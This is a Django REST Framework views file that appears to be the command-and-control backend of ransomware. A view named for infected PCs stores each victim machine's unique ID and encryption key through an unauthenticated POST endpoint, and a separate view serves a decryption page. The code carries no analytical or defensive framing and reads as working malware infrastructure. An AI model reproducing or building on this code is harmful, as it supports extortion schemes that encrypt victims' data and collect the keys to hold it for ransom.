from rest_framework import generics
from .models import InfectedPc
from .serializers import InfectedPcSerializer

from rest_framework import generics
from rest_framework import permissions
from rest_framework.response import Response
from rest_framework.views import status
from django.shortcuts import render


class ListInfectedPcView(generics.ListAPIView):
    """
    Provides a get method handler.
    """
    queryset = InfectedPc.objects.all()
    serializer_class = InfectedPcSerializer
    #permission_classes = (permissions.IsAuthenticated,)

    def post(self, request, *args, **kwargs):
        created = InfectedPc.objects.get_or_create(
            uniqueId=request.data['uniqueId'],
            encryptionKey=request.data['encryptionKey'],
        )
        if created[1]:
            return Response(
                data="InfectedPC entry added",
                status=status.HTTP_201_CREATED
            )
        else:
            return Response(
                data="InfectedPC already existing",
                status=status.HTTP_200_OK
            )
def decrypt(request):
    return render(request, 'index.html')

